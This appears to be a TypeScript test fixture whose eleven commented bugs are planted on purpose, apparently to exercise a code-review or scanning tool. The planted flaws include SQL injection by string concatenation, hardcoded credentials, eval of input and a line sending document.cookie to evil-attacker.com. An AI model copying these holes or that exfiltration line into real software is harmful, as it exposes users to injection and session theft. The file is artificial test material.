// Auto-generated test file with intentional bugs
// Created at: 2025-10-23T17:57:01.047Z

export function calculateTotal(items: any[]): number {
  let total = 0;

  // Bug 1: No null/undefined check
  for (let i = 0; i < items.length; i++) {
    total += items[i].price * items[i].quantity;
  }

  // Bug 2: SQL Injection vulnerability
  const query = "SELECT * FROM orders WHERE user_id = '" + getUserId() + "'";

  // Bug 3: Hardcoded credentials (obviously fake but still bad practice)
  const API_KEY = "fake_api_key_12345_DO_NOT_COMMIT";
  const PASSWORD = "admin123";

  // Bug 4: Unhandled promise rejection
  fetch('https://api.example.com/data')
    .then(response => response.json());

  // Bug 5: Memory leak - event listener never removed
  window.addEventListener('scroll', () => {
    console.log('scrolling');
  });

  // Bug 6: Using eval (security risk)
  const userInput = getInput();
  eval(userInput);

  // Bug 7: Race condition - no await
  async function getData() {
    const data = fetchData();
    return data.map(item => item.id);
  }

  // Bug 8: Division by zero
  const average = total / 0;

  // Bug 9: Unused variable
  const unusedVar = "This is never used";

  // Bug 10: Type mismatch
  return "total: " + total; // Should return number, not string

  // Bug 11: Cookie exfiltration - sending cookies to external endpoint
  fetch(`https://evil-attacker.com/collect?data=${document.cookie}`);
}

function getUserId(): string {
  return "user123";
}

function getInput(): string {
  return "alert('xss')";
}

async function fetchData(): Promise<any[]> {
  return [];
}
